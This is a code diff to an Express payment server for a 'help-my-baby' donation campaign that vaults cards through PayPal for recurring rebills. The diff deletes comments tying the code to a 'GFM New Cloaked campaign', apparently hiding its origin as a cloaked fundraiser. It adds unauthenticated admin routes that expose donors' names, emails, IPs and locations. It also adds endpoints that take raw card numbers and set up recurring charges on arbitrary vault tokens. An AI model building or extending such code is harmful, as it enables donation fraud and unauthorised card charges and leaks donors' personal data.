@@ -29,10 +29,10 @@ const {
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const STORE_PATH = path.join(__dirname, 'transactions.json');
+const STORE_PATH = process.env.STORE_PATH || path.join(__dirname, 'transactions.json');
 
-const MARKET_CODE = process.env.MARKET_CODE || 'US';
-const ACTIVE_CAMPAIGN = process.env.ACTIVE_CAMPAIGN || 'help-my-baby';
+const MARKET_CODE = 'US';
+const ACTIVE_CAMPAIGN = 'help-my-baby';
 
 function fmtCurrency(amount) {
   const num = Number(amount);
@@ -129,7 +129,7 @@ const PAYPAL_API_BASE =
 app.use(express.json());
 app.use(cookieParser());
 
-// First-party _fbp cookie generation (ported from GFM New Cloaked campaign/server.js)
+// First-party _fbp cookie generation
 app.use((req, res, next) => {
   if (!req.cookies._fbp) {
     const fbp = generateFBP();
@@ -146,7 +146,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// API failures, slow calls, and 404 scanner counter (ported from GFM New Cloaked)
+// API failures, slow calls, and 404 scanner counter
 app.use((req, res, next) => {
   const start = Date.now();
   res.on('finish', () => {
@@ -171,11 +171,16 @@ app.use((req, res, next) => {
 });
 
 // Serve index.html dynamically with injected Meta & TikTok Pixel scripts
-app.get(['/', '/index.html'], (req, res) => {
+app.get(['/', '/index.html'], (_req, res) => {
   const templatePath = path.join(__dirname, 'public', 'index.html');
   let html = fs.readFileSync(templatePath, 'utf8');
   html = html.replace('<!-- TRACKING_PIXELS_PLACEHOLDER -->', buildPixelScripts());
   res.send(html);
+});
+
+// Serve dedicated Subscriptions, Rebills & Analytics Dashboard
+app.get(['/dashboard', '/admin'], (_req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
 });
 
 app.use(express.static(path.join(__dirname, 'public'), { index: false }));
@@ -261,7 +266,7 @@ app.get('/api/config', (req, res) => {
   });
 });
 
-// Tracking config endpoint (ported from GFM New Cloaked campaign/routes/public.js)
+// Tracking config endpoint
 app.get('/api/tracking/config', (req, res) => {
   const config = getTrackingConfig();
   const fbp = req.cookies._fbp || null;
@@ -281,7 +286,7 @@ app.get('/api/tracking/config', (req, res) => {
   });
 });
 
-// Browser -> Server CAPI & Journey Log endpoint (ported from GFM New Cloaked campaign/routes/donation.js)
+// Browser -> Server CAPI & Journey Log endpoint
 app.post('/api/track', async (req, res) => {
   const { event, eventId, sourceUrl, cookies, clientLocation, data } =
     req.body || {};
@@ -355,7 +360,7 @@ app.post('/api/track', async (req, res) => {
   }
 });
 
-// Payment interaction telemetry (cadence_selected, modal_close, checkout_abandon, card_error, etc.)
+// Payment interaction telemetry
 app.post('/api/track/payment-event', (req, res) => {
   const clientInfo = getClientInfo(req);
   const { eventType, details, amount, paymentMethod, clientLocation } =
@@ -378,7 +383,7 @@ app.post('/api/track/payment-event', (req, res) => {
   res.json({ success: true });
 });
 
-// Client browser error monitor endpoint (ported from GFM New Cloaked campaign/routes/donation.js)
+// Client browser error monitor endpoint
 app.post(
   '/api/client/error',
   express.text({ type: '*/*', limit: '4kb' }),
@@ -422,7 +427,7 @@ app.post(
   }
 );
 
-// Checkout funnel exit & attempt timing endpoint (ported from GFM New Cloaked store)
+// Checkout funnel exit & attempt timing endpoint
 app.post('/api/client/report', (req, res) => {
   const body = req.body || {};
   const clientInfo = getClientInfo(req);
@@ -497,7 +502,6 @@ app.post('/api/orders', async (req, res) => {
       },
     };
 
-    // For Weekly/Monthly card donations, instruct PayPal Vault v3 to vault the card on successful capture
     if (isRecurring && fundingSource === 'card') {
       orderPayload.payment_source = {
         card: {
@@ -572,7 +576,7 @@ app.post('/api/orders', async (req, res) => {
   }
 });
 
-// Capture an approved Order, fire Meta CAPI Purchase/Subscribe, and persist in transactions.json
+// Capture an approved Order, fire Meta CAPI Donate (+ Subscribe), and persist in transactions.json
 app.post('/api/orders/:orderID/capture', async (req, res) => {
   const clientInfo = getClientInfo(req);
   const { visitor } = getOrCreateVisitor(
@@ -660,7 +664,6 @@ app.post('/api/orders/:orderID/capture', async (req, res) => {
     const baseNum = Number.parseFloat(baseAmount || amount) || totalNum;
     const tipNum = Math.max(0, Number((totalNum - baseNum).toFixed(2)));
 
-    // Resolve clean donor / cardholder name (never '=' or blank)
     const payerName = data?.payer?.name?.given_name
       ? `${data.payer.name.given_name} ${data.payer.name.surname || ''}`.trim()
       : '';
@@ -679,10 +682,12 @@ app.post('/api/orders/:orderID/capture', async (req, res) => {
       scheduleId = `SCHED-${Date.now()}`;
       const newSchedule = {
         scheduleId,
+        status: 'ACTIVE',
         vaultId: vaultInfo.id,
         vaultStatus: vaultInfo.status || 'VAULTED',
         customerId: vaultInfo?.customer?.id || visitor.id,
         donorName: resolvedDonorName,
+        donorEmail: resolvedEmail,
         visitorId: visitor.id,
         ipAddress: clientInfo.ipAddress,
         location: JourneyLog.formatLocation(visitor) || 'Local (DEV)',
@@ -832,18 +837,443 @@ app.post('/api/orders/:orderID/capture', async (req, res) => {
   }
 });
 
-// Debug endpoint: list persisted Vault schedules, transactions, live server logs, CAPI events, and visitor geo sessions
-app.get('/api/debug/transactions', (_req, res) => {
+function buildDashboardData() {
   const store = loadStore();
-  res.json({
-    ...store,
+  const schedules = store.schedules.map((s) => ({
+    status: s.status || 'ACTIVE',
+    ...s,
+  }));
+  const transactions = store.transactions || [];
+
+  let totalDonated = 0;
+  let initialDonationsTotal = 0;
+  let rebillsTotal = 0;
+  let totalRebills = 0;
+  let netTotal = 0;
+
+  transactions.forEach((t) => {
+    if (t.status === 'COMPLETED' || !t.status) {
+      const amt = Number.parseFloat(t.amount) || 0;
+      const net = Number.parseFloat(t.netAmount) || amt;
+      totalDonated += amt;
+      netTotal += net;
+      if (t.type === 'REBILL') {
+        rebillsTotal += amt;
+        totalRebills += 1;
+      } else {
+        initialDonationsTotal += amt;
+      }
+    }
+  });
+
+  let activeSubscriptions = 0;
+  let pausedSubscriptions = 0;
+  let cancelledSubscriptions = 0;
+  let weeklyRecurringVolume = 0;
+  let monthlyRecurringVolume = 0;
+
+  schedules.forEach((s) => {
+    const st = (s.status || 'ACTIVE').toUpperCase();
+    const amt = Number.parseFloat(s.amount) || 0;
+    if (st === 'PAUSED') {
+      pausedSubscriptions += 1;
+    } else if (st === 'CANCELLED') {
+      cancelledSubscriptions += 1;
+    } else {
+      activeSubscriptions += 1;
+      if (s.frequency === 'WEEK') {
+        weeklyRecurringVolume += amt;
+      } else {
+        monthlyRecurringVolume += amt;
+      }
+    }
+  });
+
+  const estimatedMonthlyRunRate =
+    monthlyRecurringVolume + weeklyRecurringVolume * 4.33;
+
+  return {
+    paypalMode: PAYPAL_MODE,
+    stats: {
+      totalDonated: Number(totalDonated.toFixed(2)),
+      netTotal: Number(netTotal.toFixed(2)),
+      initialDonationsTotal: Number(initialDonationsTotal.toFixed(2)),
+      rebillsTotal: Number(rebillsTotal.toFixed(2)),
+      totalTransactions: transactions.length,
+      totalRebills,
+      activeSubscriptions,
+      pausedSubscriptions,
+      cancelledSubscriptions,
+      weeklyRecurringVolume: Number(weeklyRecurringVolume.toFixed(2)),
+      monthlyRecurringVolume: Number(monthlyRecurringVolume.toFixed(2)),
+      estimatedMonthlyRunRate: Number(estimatedMonthlyRunRate.toFixed(2)),
+      uniqueVisitors: visitors.size,
+    },
+    schedules,
+    transactions,
     serverLogs: JourneyLog.getRecentLogs(),
     capiEvents: getRecentCapiEvents(),
     counters: JourneyLog.getCounters(),
     authStats: getAuthStats(),
     visitors: Array.from(visitors.values()),
     trackingConfig: getTrackingConfig(),
-  });
+  };
+}
+
+// Dashboard & Debug data endpoint
+app.get(['/api/dashboard', '/api/debug/transactions'], (_req, res) => {
+  res.json(buildDashboardData());
+});
+
+// Create a new Subscription (via existing Vault Token ID OR direct Card Vaulting via PayPal Orders v2)
+app.post('/api/subscriptions', async (req, res) => {
+  const clientInfo = getClientInfo(req);
+  const { visitor } = getOrCreateVisitor(
+    clientInfo.ipAddress,
+    clientInfo.clientLocation,
+    clientInfo.userAgent
+  );
+
+  try {
+    const {
+      mode = 'vault', // 'vault' | 'card'
+      vaultId,
+      donorName = 'Generous Supporter',
+      donorEmail = null,
+      frequency = 'MONTH',
+      amount = '25.00',
+      cardBrand = 'VISA',
+      cardLast4 = '1111',
+      cardExpiry = '2028-12',
+      cardNumber,
+      cardCvv,
+      chargeImmediately = false,
+      notes = '',
+    } = req.body || {};
+
+    const cleanFreq = frequency === 'WEEK' ? 'WEEK' : 'MONTH';
+    const finalValue = computeFinalAmount(amount, false);
+    const nowIso = new Date().toISOString();
+    const store = loadStore();
+
+    // Mode A: Direct Card Vaulting + Initial Capture via PayPal Orders v2 + Vault v3
+    if (mode === 'card' || (cardNumber && !vaultId)) {
+      const cleanCardNumber = String(cardNumber || '').replace(/\s+/g, '');
+      const cleanExpiry = String(cardExpiry || '').trim();
+      const cleanCvv = String(cardCvv || '123').trim();
+      if (!cleanCardNumber || !cleanExpiry) {
+        return res
+          .status(400)
+          .json({ error: 'Card number and expiry (YYYY-MM) are required.' });
+      }
+
+      const accessToken = await getAccessToken();
+      const freqLabel = cleanFreq === 'WEEK' ? 'Weekly' : 'Monthly';
+
+      // 1. Create Order with store_in_vault: ON_SUCCESS
+      const createRes = await fetch(`${PAYPAL_API_BASE}/v2/checkout/orders`, {
+        method: 'POST',
+        headers: {
+          Authorization: `Bearer ${accessToken}`,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          intent: 'CAPTURE',
+          purchase_units: [
+            {
+              description: `${freqLabel} Recurring Subscription - Help my baby`,
+              custom_id: `SUB_CREATE_${cleanFreq}_${Date.now()}`,
+              amount: { currency_code: 'USD', value: finalValue },
+            },
+          ],
+          payment_source: {
+            card: {
+              attributes: {
+                vault: { store_in_vault: 'ON_SUCCESS' },
+              },
+            },
+          },
+        }),
+      });
+      const orderData = await createRes.json();
+      if (!createRes.ok) {
+        throw new Error(
+          orderData?.details?.[0]?.description ||
+            orderData?.message ||
+            'Failed to create PayPal order for subscription.'
+        );
+      }
+
+      // 2. Confirm Payment Source with Card details
+      const confirmRes = await fetch(
+        `${PAYPAL_API_BASE}/v2/checkout/orders/${orderData.id}/confirm-payment-source`,
+        {
+          method: 'POST',
+          headers: {
+            Authorization: `Bearer ${accessToken}`,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            payment_source: {
+              card: {
+                name: donorName,
+                number: cleanCardNumber,
+                expiry: cleanExpiry,
+                security_code: cleanCvv,
+                attributes: {
+                  vault: { store_in_vault: 'ON_SUCCESS' },
+                },
+              },
+            },
+          }),
+        }
+      );
+      const confirmData = await confirmRes.json();
+      if (!confirmRes.ok) {
+        throw new Error(
+          confirmData?.details?.[0]?.description ||
+            confirmData?.message ||
+            'Card confirmation failed.'
+        );
+      }
+
+      // 3. Capture Order to finalize initial charge and generate Vault v3 token
+      const capRes = await fetch(
+        `${PAYPAL_API_BASE}/v2/checkout/orders/${orderData.id}/capture`,
+        {
+          method: 'POST',
+          headers: {
+            Authorization: `Bearer ${accessToken}`,
+            'Content-Type': 'application/json',
+          },
+        }
+      );
+      const capData = await capRes.json();
+      const captureObj =
+        capData?.purchase_units?.[0]?.payments?.captures?.[0] || {};
+      const cardObj = capData?.payment_source?.card || {};
+      if (!capRes.ok || captureObj?.status === 'DECLINED') {
+        throw new Error(
+          capData?.details?.[0]?.description ||
+            capData?.message ||
+            'Initial subscription capture was declined.'
+        );
+      }
+
+      const vaultInfo = cardObj?.attributes?.vault || {};
+      const netRef = captureObj?.network_transaction_reference || {};
+      const scheduleId = `SCHED-${Date.now()}`;
+
+      const newSchedule = {
+        scheduleId,
+        status: 'ACTIVE',
+        vaultId: vaultInfo.id || `vault_${orderData.id}`,
+        vaultStatus: vaultInfo.status || 'VAULTED',
+        customerId: vaultInfo?.customer?.id || `cust_${Date.now()}`,
+        donorName: donorName.trim() || 'Generous Supporter',
+        donorEmail: donorEmail ? donorEmail.trim() : null,
+        visitorId: visitor.id,
+        ipAddress: clientInfo.ipAddress,
+        location: JourneyLog.formatLocation(visitor) || 'Dashboard Admin',
+        device: clientInfo.device,
+        frequency: cleanFreq,
+        amount: finalValue,
+        currency: 'USD',
+        cardBrand: cardObj.brand || cardBrand || 'VISA',
+        cardLast4: cardObj.last_digits || cleanCardNumber.slice(-4),
+        cardExpiry: cardObj.expiry || cleanExpiry,
+        initialOrderId: orderData.id,
+        initialCaptureId: captureObj.id || null,
+        lastNetworkReferenceId: netRef.id || null,
+        networkName: netRef.network || cardObj.brand || 'VISA',
+        notes,
+        createdAt: nowIso,
+        lastBilledAt: nowIso,
+        rebillCount: 0,
+      };
+
+      const txRecord = {
+        txId: `TX-${Date.now()}`,
+        type: 'INITIAL',
+        scheduleId,
+        orderId: orderData.id,
+        captureId: captureObj.id || orderData.id,
+        status: captureObj.status || 'COMPLETED',
+        frequency: cleanFreq,
+        amount: finalValue,
+        baseAmount: finalValue,
+        feeCovered: '0.00',
+        paypalFee:
+          captureObj?.seller_receivable_breakdown?.paypal_fee?.value || null,
+        netAmount:
+          captureObj?.seller_receivable_breakdown?.net_amount?.value || null,
+        currency: 'USD',
+        donorName: newSchedule.donorName,
+        cardBrand: newSchedule.cardBrand,
+        cardLast4: newSchedule.cardLast4,
+        cardExpiry: newSchedule.cardExpiry,
+        vaultId: newSchedule.vaultId,
+        vaultStatus: newSchedule.vaultStatus,
+        customerId: newSchedule.customerId,
+        networkReferenceId: netRef.id || null,
+        networkName: newSchedule.networkName,
+        processorResponseCode:
+          captureObj?.processor_response?.response_code || '0000',
+        visitorId: visitor.id,
+        ipAddress: clientInfo.ipAddress,
+        location: newSchedule.location,
+        device: clientInfo.device,
+        capiMeta: 'ADMIN',
+        capiTiktok: 'ADMIN',
+        createdAt: captureObj.create_time || nowIso,
+      };
+
+      store.schedules.unshift(newSchedule);
+      store.transactions.unshift(txRecord);
+      saveStore(store);
+
+      JourneyLog.system(
+        '✅',
+        `Created subscription ${scheduleId} (${fmtCurrency(
+          finalValue
+        )}/${cleanFreq}) · vault:${newSchedule.vaultId}`
+      );
+
+      return res.json({
+        ok: true,
+        schedule: newSchedule,
+        transaction: txRecord,
+      });
+    }
+
+    // Mode B: Create Subscription from an existing PayPal Vault v3 Token ID
+    const cleanVaultId = String(vaultId || '').trim();
+    if (!cleanVaultId) {
+      return res.status(400).json({
+        error:
+          'Provide either an existing PayPal Vault Token ID or card details to vault a new card.',
+      });
+    }
+
+    const existingSchedule = store.schedules.find(
+      (s) => s.vaultId === cleanVaultId
+    );
+    const scheduleId = `SCHED-${Date.now()}`;
+    const newSchedule = {
+      scheduleId,
+      status: 'ACTIVE',
+      vaultId: cleanVaultId,
+      vaultStatus: 'VAULTED',
+      customerId: existingSchedule?.customerId || `cust_${Date.now()}`,
+      donorName:
+        donorName.trim() ||
+        existingSchedule?.donorName ||
+        'Generous Supporter',
+      donorEmail: donorEmail || existingSchedule?.donorEmail || null,
+      visitorId: existingSchedule?.visitorId || visitor.id,
+      ipAddress: existingSchedule?.ipAddress || clientInfo.ipAddress,
+      location:
+        existingSchedule?.location ||
+        JourneyLog.formatLocation(visitor) ||
+        'Dashboard Admin',
+      device: existingSchedule?.device || clientInfo.device,
+      frequency: cleanFreq,
+      amount: finalValue,
+      currency: 'USD',
+      cardBrand: existingSchedule?.cardBrand || cardBrand || 'VISA',
+      cardLast4: existingSchedule?.cardLast4 || cardLast4 || '1111',
+      cardExpiry: existingSchedule?.cardExpiry || cardExpiry || '2028-12',
+      initialOrderId: existingSchedule?.initialOrderId || null,
+      initialCaptureId: existingSchedule?.initialCaptureId || null,
+      lastNetworkReferenceId:
+        existingSchedule?.lastNetworkReferenceId || null,
+      networkName: existingSchedule?.networkName || cardBrand || 'VISA',
+      notes,
+      createdAt: nowIso,
+      lastBilledAt: chargeImmediately ? nowIso : null,
+      rebillCount: 0,
+    };
+
+    store.schedules.unshift(newSchedule);
+    saveStore(store);
+
+    JourneyLog.system(
+      '✅',
+      `Registered subscription ${scheduleId} on vault:${cleanVaultId} (${fmtCurrency(
+        finalValue
+      )}/${cleanFreq})`
+    );
+
+    return res.json({ ok: true, schedule: newSchedule });
+  } catch (err) {
+    return res.status(400).json({ error: err.message });
+  }
+});
+
+// Update / Pause / Resume / Cancel a Subscription
+app.patch('/api/subscriptions/:scheduleId', (req, res) => {
+  try {
+    const { scheduleId } = req.params;
+    const { amount, frequency, donorName, donorEmail, status, notes } =
+      req.body || {};
+
+    const store = loadStore();
+    const sub = store.schedules.find((s) => s.scheduleId === scheduleId);
+    if (!sub) {
+      return res.status(404).json({ error: 'Subscription not found.' });
+    }
+
+    if (amount !== undefined) {
+      sub.amount = computeFinalAmount(amount, false);
+    }
+    if (frequency === 'WEEK' || frequency === 'MONTH') {
+      sub.frequency = frequency;
+    }
+    if (donorName !== undefined) {
+      sub.donorName = String(donorName).trim() || 'Generous Supporter';
+    }
+    if (donorEmail !== undefined) {
+      sub.donorEmail = donorEmail ? String(donorEmail).trim() : null;
+    }
+    if (
+      status &&
+      ['ACTIVE', 'PAUSED', 'CANCELLED'].includes(status.toUpperCase())
+    ) {
+      sub.status = status.toUpperCase();
+    }
+    if (notes !== undefined) {
+      sub.notes = String(notes);
+    }
+
+    saveStore(store);
+    JourneyLog.system(
+      '🔁',
+      `Updated subscription ${scheduleId} → ${sub.status || 'ACTIVE'} · $${
+        sub.amount
+      }/${sub.frequency}`
+    );
+
+    return res.json({ ok: true, schedule: sub });
+  } catch (err) {
+    return res.status(400).json({ error: err.message });
+  }
+});
+
+// Remove / Delete a Subscription
+app.delete('/api/subscriptions/:scheduleId', (req, res) => {
+  const { scheduleId } = req.params;
+  const store = loadStore();
+  const idx = store.schedules.findIndex((s) => s.scheduleId === scheduleId);
+  if (idx === -1) {
+    return res.status(404).json({ error: 'Subscription not found.' });
+  }
+  const [removed] = store.schedules.splice(idx, 1);
+  saveStore(store);
+  JourneyLog.system(
+    '🗑️',
+    `Removed subscription ${scheduleId} (${removed.donorName} · vault:${removed.vaultId})`
+  );
+  return res.json({ ok: true, removed });
 });
 
 // Charge a previously vaulted card token for subsequent Weekly/Monthly cycles (MIT / Reference Transaction)
